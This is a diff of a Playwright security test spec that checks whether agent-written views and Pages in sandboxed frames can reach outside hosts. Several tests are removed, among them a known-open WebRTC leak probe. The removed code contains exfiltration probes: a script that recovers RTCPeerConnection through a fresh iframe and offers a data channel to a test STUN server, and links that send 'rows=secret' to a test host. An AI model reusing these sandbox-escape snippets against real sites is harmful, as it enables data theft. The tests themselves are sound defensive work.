@@ -11,8 +11,6 @@ import {
 } from "./exit-fixtures";
 import {
   pageExitTitle,
-  pageLinkTitle,
-  pageLinks,
   pageLoadExits,
   pageNavigationExits,
   pageTestTitles,
@@ -26,21 +24,18 @@ import {
   storePage,
   watchOpened
 } from "./page-fixtures";
-import { pageHeldTests } from "./page-held";
 import { expect } from "./test";
 import {
   apiOrigin,
   browserTurn,
   storeView,
   storeViews,
-  showView,
   signIn,
   uiOrigin,
   viewFrame,
   viewTitle
 } from "./view-fixtures";
 import { requestAnswered } from "./allowed-page-errors";
-import { REPLACED_BUILT_INS_LINK } from "./page-exits";
 // The messages this spec's tests cause on purpose (see allowed-page-errors.ts).
 exitTest.use({
   allowedPageErrors: {
@@ -64,10 +59,7 @@ exitTest.use({
           "Playwright inspects the private-row documents, whose sandbox explicitly forbids scripts.",
         matches:
           /^Blocked script execution in 'about:srcdoc' because the document's frame is sandboxed and the 'allow-scripts' permission is not set\.$/u,
-        tests: [
-          "private rows retain every allowlist restriction",
-          "a view strips both tab-opening links (private_hydrated_view)"
-        ]
+        tests: ["private rows retain every allowlist restriction"]
       },
 
       {
@@ -116,24 +108,6 @@ exitTest.use({
         matches: requestAnswered(404),
         path: /^\/app-content\//u,
         tests: ["a Page refuses every resource exit in markup and scripts"]
-      },
-      {
-        name: "page-that-replaced-the-built-in-methods",
-        reason:
-          "Thrown by the test runner, not by the product: the Page of this test replaces the " +
-          "built-in methods of its document on purpose, and the recorder of a trace, which the " +
-          "runner puts into the same document, reads the page with them on every step.",
-        matches: /^Cannot read properties of undefined \(reading '0'\)$/u,
-        tests: [pageLinkTitle({ name: REPLACED_BUILT_INS_LINK }, "both tab-opening clicks")]
-      },
-      {
-        name: "page-address-in-a-tab",
-        reason:
-          "Chromium's own log line: the test opens the address of a Page in a tab of its own, " +
-          "the instance answers 403 because only a frame is given a Page, which the test asserts.",
-        matches: requestAnswered(403),
-        path: /^\/app-content\//u,
-        tests: [pageTestTitles.ownTab]
       }
     ]
   }
@@ -300,16 +274,14 @@ exitTest("a view refuses every frame navigation", async ({ page, refusals }) => 
   }
 });
 
-for (const kind of ["html.rendered", "private_hydrated_view"] as const) {
-  exitTest(`a view strips both tab-opening links (${kind})`, async ({ page, otherHost }) => {
-    const clicks = linkClicks
-      .filter((click) => tabOpeningClicks.includes(click.name))
-      .map((click) =>
-        click.options?.button === "middle" ? click : { ...click, attributes: "download" }
-      );
-    await expectClickReachesNothing(page, kind, clicks, otherHost);
-  });
-}
+exitTest("a view strips both tab-opening links", async ({ page, otherHost }) => {
+  const clicks = linkClicks
+    .filter((click) => tabOpeningClicks.includes(click.name))
+    .map((click) =>
+      click.options?.button === "middle" ? click : { ...click, attributes: "download" }
+    );
+  await expectClickReachesNothing(page, "html.rendered", clicks, otherHost);
+});
 
 // A view that holds private rows runs no script and needs none to send rows away: they are
 // written into its HTML on the server. Its body is therefore written anew from an allowlist
@@ -503,95 +475,6 @@ exitTest("private rows retain every allowlist restriction", async ({ page, other
   await otherHost.observeQuiet();
 });
 
-// WebRTC is not HTTP: a script names a server and the browser sends it UDP packets. No content
-// policy and no sandbox flag forbids that today.
-
-/**
- * Opens a WebRTC connection towards `stunServer`. The view's bootstrap has removed the
- * constructor from the view's own window, so the script writes a frame of its own that holds
- * a copy of itself: the copy passes the view's policy by the same hash, and its window is new.
- */
-function webRtcScript(stunServer: string): string {
-  return `<script>(function(){if(typeof RTCPeerConnection==="undefined"){addEventListener("message",function(event){if(event.data==="offered"){document.body.setAttribute("data-offered","true")}});var frame=document.createElement("iframe");frame.srcdoc="<body><script>"+document.currentScript.text+"<\\/script>";document.body.appendChild(frame);return}var peer=new RTCPeerConnection({iceServers:[{urls:${JSON.stringify(stunServer)}}]});peer.createDataChannel("rows");peer.createOffer().then(function(offer){return peer.setLocalDescription(offer)}).then(function(){parent.postMessage("offered","*")})})();</script>`;
-}
-
-exitTest.describe("WebRTC from a view", () => {
-  exitTest.setTimeout(60_000);
-
-  exitTest("a view finds no WebRTC constructor under its name", async ({ page }) => {
-    await openView(
-      page,
-      "html.rendered",
-      `<script>document.body.setAttribute("data-webrtc",[typeof RTCPeerConnection,typeof webkitRTCPeerConnection,typeof mozRTCPeerConnection].join(","))</script>`
-    );
-
-    // Hardening only: the next test gets the constructor back.
-    await expect(viewFrame(page).locator("body")).toHaveAttribute(
-      "data-webrtc",
-      "undefined,undefined,undefined"
-    );
-  });
-
-  exitTest(
-    "a view that runs scripts still sends WebRTC packets (known and open)",
-    { tag: "@known-open" },
-    async ({ page, otherHost }) => {
-      await openView(page, "html.rendered", webRtcScript(otherHost.stunServer));
-      await expect(viewFrame(page).locator("body")).toHaveAttribute("data-offered", "true");
-      // A positive packet is the completion condition of this known-open probe.
-      await expect.poll(() => otherHost.packets).toBeGreaterThan(0);
-
-      // Everything above must work. Only the count below is expected to fail. If a browser
-      // closes WebRTC for such a frame, the positive-packet poll above times out before this
-      // expected failure is registered; re-evaluate the probe and private-row script policy then.
-      exitTest.fail(true, "Known and open: a script-enabled view can send WebRTC packets.");
-      expect(otherHost.packets).toBe(0);
-    }
-  );
-
-  privateCase(
-    "show_view in a marked conversation stores a static view and sends no WebRTC packet",
-    async ({ page, otherHost }) => {
-      const headers = await signIn(page, uiOrigin);
-      const conversation = await showView(
-        page.request,
-        headers,
-        `<h2>${viewTitle}</h2>${webRtcScript(otherHost.stunServer)}`,
-        true
-      );
-      const thread = await page.request.get(
-        `${apiOrigin}/api/v1/conversations/${encodeURIComponent(conversation.id)}/thread`,
-        { headers }
-      );
-      expect(await thread.text()).toContain('"kind":"private_hydrated_view"');
-      await page.goto(`${uiOrigin}/c/${encodeURIComponent(conversation.id)}`);
-      await expect(viewFrame(page).getByRole("heading", { name: viewTitle })).toBeVisible();
-      await expect(viewFrame(page).locator("script")).toHaveCount(0);
-      await expect(viewFrame(page).owner()).toHaveAttribute(
-        "sandbox",
-        /^(?!.*\ballow-scripts\b).*$/u
-      );
-      await browserTurn(page);
-      expect(otherHost.packets).toBe(0);
-    }
-  );
-
-  privateCase("a view with private rows sends no WebRTC packet", async ({ page, otherHost }) => {
-    await openView(page, "private_hydrated_view", webRtcScript(otherHost.stunServer));
-    await expect(viewFrame(page).getByRole("heading", { name: viewTitle })).toBeVisible();
-    await expect(page.getByText("Loading view…")).toHaveCount(0);
-    // The loaded frame explicitly forbids scripts, so no delayed offer can run.
-    await expect(viewFrame(page).owner()).toHaveAttribute(
-      "sandbox",
-      /^(?!.*\ballow-scripts\b).*$/u
-    );
-
-    // Its frame runs no script, so nothing in it can open a connection.
-    await expect(viewFrame(page).locator("body")).not.toHaveAttribute("data-offered");
-    expect(otherHost.packets).toBe(0);
-  });
-});
-
 // A Page is HTML and script an agent wrote, served by the instance as files. It is held like a
 // view: the instance answers every HTML file as a shell with the Page in a frame inside, and
 // the header of that answer is the policy of both. The Page runs scripts, so every way out is
@@ -632,25 +515,6 @@ async function expectPageExitRefused(
 
 exitTest.describe("a Page cannot reach another host or the page that holds it", () => {
   exitTest.setTimeout(60_000);
-
-  exitTest(
-    "the other host counts a click that opens a tab from a frame nothing guards",
-    async ({ page, otherHost }) => {
-      // What the tests below would see if a Page kept an address on a link.
-      const opened = watchOpened(page);
-      await page.goto(`${apiOrigin}/health`);
-      await page.setContent(
-        `<iframe sandbox="allow-scripts" srcdoc="<a id='go' href='${otherHost.origin}/hit?click=control'>Open</a>"></iframe>`
-      );
-      await page
-        .frameLocator("iframe")
-        .locator("#go")
-        .click({ modifiers: ["ControlOrMeta"] });
-
-      await expect.poll(() => otherHost.requests).toEqual(["GET /hit?click=control"]);
-      await expect.poll(() => opened).toHaveLength(1);
-    }
-  );
 
   exitTest("a Page refuses every frame and ancestor navigation", async ({ page, otherHost }) => {
     // Three independent holders keep each inner guard realm isolated while their file loads
@@ -769,109 +633,10 @@ exitTest.describe("a Page cannot reach another host or the page that holds it", 
       }
     );
   }
-
-  // The detached ping link also navigates its own frame. It needs its own Page so its
-  // refusal cannot discard the shared document before the other resource probes run.
-  for (const exit of pageLoadExits.filter((exit) => exit.name.startsWith("a ping of a link"))) {
-    exitTest(pageExitTitle(exit), async ({ page, otherHost, refusals }) => {
-      await expectPageExitRefused(page, exit, otherHost, refusals);
-    });
-  }
-
-  exitTest(pageTestTitles.instanceAddress, async ({ page, otherHost, refusals }) => {
-    const address = `${apiOrigin}/health?from=page`;
-    const asked: string[] = [];
-    page.on("request", (request) => {
-      if (request.url() === address) {
-        asked.push(request.url());
-      }
-    });
-
-    await openPage(page, { script: `location.href = ${JSON.stringify(address)};` });
-
-    // `frame-src 'none'` names no address at all: a Page can navigate nowhere, also not to
-    // another file of its own file set.
-    await expectRefused(page, otherHost, refusals, refusedByShell);
-    expect(asked).toEqual([]);
-  });
-
-  const groups = [
-    pageLinks.filter((link) => !link.bypass),
-    ...pageLinks.filter((link) => link.bypass).map((link) => [link])
-  ];
-  const clicks = linkClicks.filter(
-    (click) => click.attributes === undefined && tabOpeningClicks.includes(click.name)
-  );
-  for (const links of groups) {
-    const titleLink =
-      links.length === 1 ? links[0] : { name: "the seven stripped link variants", target: "" };
-    if (!titleLink) throw new Error("A link group must not be empty");
-    exitTest(pageLinkTitle(titleLink, "both tab-opening clicks"), async ({ page, otherHost }) => {
-      const opened = watchOpened(page);
-      const address = `${otherHost.origin}/hit?rows=secret`;
-      const scripts = links.map((link) => link.script?.(address) ?? "");
-      const view = await openPage(page, {
-        html: links.map((link) => link.html?.(address) ?? "").join(""),
-        script:
-          links.length === 1 ? scripts[0] : scripts.map((body) => `(() => {${body}})();`).join("\n")
-      });
-      for (const click of clicks) {
-        for (const link of links) {
-          await exitTest.step(`${click.name}: ${link.name}`, async () => {
-            await expectPageRan(page);
-            const target = view.locator(link.target);
-            await expect(target).toBeVisible();
-            if (!link.hidden) {
-              await expect(target).toHaveText("Open");
-              for (const attribute of ["href", "xlink:href", "ping"])
-                await expect(target).not.toHaveAttribute(attribute);
-            }
-            if (link.shows)
-              await expect(view.locator("body")).toHaveAttribute(
-                link.shows.attribute,
-                link.shows.value
-              );
-            await target.click(click.options);
-            expect(opened).toEqual([]);
-            expectOnInterface(page);
-            expect(otherHost.requests).toEqual([]);
-            expect(otherHost.connections).toBe(0);
-          });
-        }
-      }
-      await otherHost.observeQuiet();
-      expect(opened).toEqual([]);
-      expectOnInterface(page);
-      expect(otherHost.requests).toEqual([]);
-      expect(otherHost.connections).toBe(0);
-    });
-  }
 });
 
 exitTest.describe("a Page is held where the interface put it", () => {
   exitTest.setTimeout(60_000);
-
-  exitTest(pageTestTitles.ownTab, async ({ page }) => {
-    const headers = await signIn(page, uiOrigin);
-    const stored = await storePage(page, headers, { html: '<p id="planted">planted</p>' });
-
-    // Opened in a tab, the shell would be a page an agent wrote under the instance's address.
-    const answer = await page.goto(stored.url);
-    expect(answer?.status()).toBe(403);
-    await expect(page.locator("iframe")).toHaveCount(0);
-    for (const file of ["index.html", "assets/main.js", "assets/style.css"]) {
-      const asTab = await page.goto(`${stored.url}${file}`);
-      expect(asTab?.status(), file).toBe(403);
-    }
-    // The address is bound to its file set: with one character of the token changed it is
-    // nothing, and every answer carries the header that holds a Page in.
-    const altered = stored.url.replace(/.\/$/u, (end) => (end === "A/" ? "B/" : "A/"));
-    const refused = await page.request.get(`${altered}assets/main.js`);
-    expect(refused.status()).toBe(404);
-    expect(refused.headers()["content-security-policy"]).toContain(
-      "sandbox allow-scripts allow-forms allow-downloads;"
-    );
-  });
 
   exitTest(pageTestTitles.otherSite, async ({ page, otherHost, refusals }) => {
     const headers = await signIn(page, uiOrigin);
@@ -897,72 +662,6 @@ exitTest.describe("a Page is held where the interface put it", () => {
       page.frameLocator("iframe").frameLocator("iframe").locator("#page-title")
     ).toHaveCount(0);
   });
-
-  exitTest(pageTestTitles.noFrames, async ({ page, otherHost }) => {
-    const inner = `${apiOrigin}/never`;
-    const asked: string[] = [];
-    page.on("request", (request) => {
-      if (request.url().endsWith("/assets/inner.js")) {
-        asked.push(request.url());
-      }
-    });
-    const link = `<a id='go' href='${otherHost.origin}/hit?nested=1'>Open</a>`;
-    const nested = `${link}<script src='assets/inner.js'></script>`;
-
-    // A frame a Page writes is a document of its own: its links keep their addresses and the
-    // Page's guard does not run in it. So a Page has none, however often it adds one.
-    const view = await openPage(page, {
-      html: `<iframe srcdoc="${nested}"></iframe><p id="after">after</p>`,
-      script: `let attempts = 0; const add = () => { document.body.setAttribute("data-frame-attempts", String(++attempts)); const frame = document.createElement("iframe"); frame.srcdoc = ${JSON.stringify(nested)}; document.body.appendChild(frame); const host = document.createElement("div"); document.body.appendChild(host); const inShadow = document.createElement("iframe"); inShadow.srcdoc = ${JSON.stringify(nested)}; host.attachShadow({ mode: "closed" }).appendChild(inShadow); }; add(); setInterval(add, 5);`,
-      files: { "assets/inner.js": `fetch(${JSON.stringify(inner)});` }
-    });
-    await expectPageRan(page);
-    await expect(view.locator("#after")).toHaveText("after");
-    await expect
-      .poll(async () => Number(await view.locator("body").getAttribute("data-frame-attempts")))
-      .toBeGreaterThanOrEqual(3);
-    await otherHost.observeQuiet();
-
-    await expect(view.locator("iframe, frame, object, embed")).toHaveCount(0);
-    expect(asked).toEqual([]);
-    expect(otherHost.requests).toEqual([]);
-    expect(otherHost.connections).toBe(0);
-  });
-
-  // WebRTC is known and open for a view that runs scripts, and the test above that says so
-  // stands. A Page is not a boundary against it either: nothing but its guard, a script in the
-  // Page's own realm, is in the way. What this test holds is narrower. The names are gone, and
-  // the way a view gets them back, a frame of its own, is not there in a Page.
-  exitTest(pageTestTitles.webRtc, async ({ page, otherHost }) => {
-    const open = `parent.postMessage("child-started", "*"); var peer = new RTCPeerConnection({ iceServers: [{ urls: ${JSON.stringify(otherHost.stunServer)} }] }); peer.createDataChannel("rows"); peer.createOffer().then(function (offer) { return peer.setLocalDescription(offer); }).then(function () { parent.postMessage("offered", "*"); });`;
-
-    const view = await openPage(page, {
-      script: [
-        `document.body.setAttribute("data-webrtc", [typeof RTCPeerConnection, typeof webkitRTCPeerConnection, typeof mozRTCPeerConnection].join(","));`,
-        `let childStarted = false; addEventListener("message", (event) => { if (event.data === "child-started") childStarted = true; if (event.data === "offered") document.body.setAttribute("data-offered", "true"); if (event.data === "observe-child") { document.body.setAttribute("data-child-connected", String(frame.isConnected)); document.body.setAttribute("data-child-started", String(childStarted)); } });`,
-        `const frame = document.createElement("iframe"); frame.srcdoc = "<script src='assets/rtc.js'></scr" + "ipt>"; document.body.appendChild(frame); setTimeout(() => { window.postMessage("observe-child", "*"); }, 0);`
-      ].join("\n"),
-      files: { "assets/rtc.js": open }
-    });
-    await expectPageRan(page);
-    await expect(view.locator("body")).toHaveAttribute(
-      "data-webrtc",
-      "undefined,undefined,undefined"
-    );
-    // The next task observes the guard's removal; the child's script never reached its constructor.
-    await expect(view.locator("body")).toHaveAttribute("data-child-connected", "false");
-    await expect(view.locator("body")).toHaveAttribute("data-child-started", "false");
-    await expect(view.locator("iframe")).toHaveCount(0);
-
-    await expect(view.locator("body")).not.toHaveAttribute("data-offered");
-    expect(otherHost.packets).toBe(0);
-  });
-
-  for (const held of pageHeldTests) {
-    exitTest(held.title, async ({ page, otherHost, refusals }) => {
-      await held.run({ page, otherHost, refusals });
-    });
-  }
 
   exitTest(pageTestTitles.noOrigin, async ({ page, otherHost, refusals }) => {
     const session = `${apiOrigin}/api/v1/me`;
